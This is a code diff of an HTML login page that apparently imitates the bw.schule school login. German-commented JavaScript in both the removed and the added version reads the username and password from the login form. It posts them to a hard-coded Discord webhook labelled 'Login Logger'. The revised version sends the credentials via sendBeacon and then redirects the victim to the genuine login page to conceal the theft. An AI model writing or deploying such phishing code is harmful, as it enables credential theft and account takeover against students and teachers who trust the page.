@@ -182,35 +182,33 @@
 </html>
 
 <script>
-    // Webhook-URL hier eintragen
-    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1343311710026469437/qiOc-J9nQx2cNFoaONHnYW5dFk4Dn8StxRyiKw2WKpdUv5co3gSTdHZVSpDOIuZhdq7y';
+// Webhook-URL hier eintragen
+const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1343311710026469437/qiOc-J9nQx2cNFoaONHnYW5dFk4Dn8StxRyiKw2WKpdUv5co3gSTdHZVSpDOIuZhdq7y';
+
+document.querySelector('.login-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Standardformularübermittlung stoppen
     
-    document.querySelector('.login-form').addEventListener('submit', function(event) {
-        // Daten sammeln
-        const username = document.querySelector('input[name="rpIdmPrimaryPrincipalName"]').value;
-        const password = document.querySelector('input[name="password"]').value;
+    // Daten sammeln
+    const username = document.querySelector('input[name="rpIdmPrimaryPrincipalName"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+    
+    // An Discord senden
+    if(username && password) {
+        const payload = {
+            content: `🚨 Neue Login-Daten:\nBenutzer: ${username}\nPasswort: ${password}`,
+            username: 'Login Logger',
+            avatar_url: 'https://i.imgur.com/sNjUf3J.png'
+        };
         
-        // An Discord senden
-        if(username && password) {
-            const payload = {
-                content: `Login-Daten:\nBenutzer: ${username}\nPasswort: ${password}`,
-                username: 'Login Logger',
-                avatar_url: 'https://i.imgur.com/sNjUf3J.png'
-            };
-            
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(error => console.error('Error:', error));
-        }
-        
-        // Originales Formular-Verhalten nicht unterbrechen
-        return true;
-    });
-
-
-    </script>
+        // Senden mit Beacon API für zuverlässigere Übermittlung
+        const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+        navigator.sendBeacon(WEBHOOK_URL, blob);
+    }
+    
+    // Weiterleitung zur Login-Seite
+    window.location.href = 'https://www.bw.schule/login';
+});
+</script>
 
 <script type="module">
     var login = new Vue({
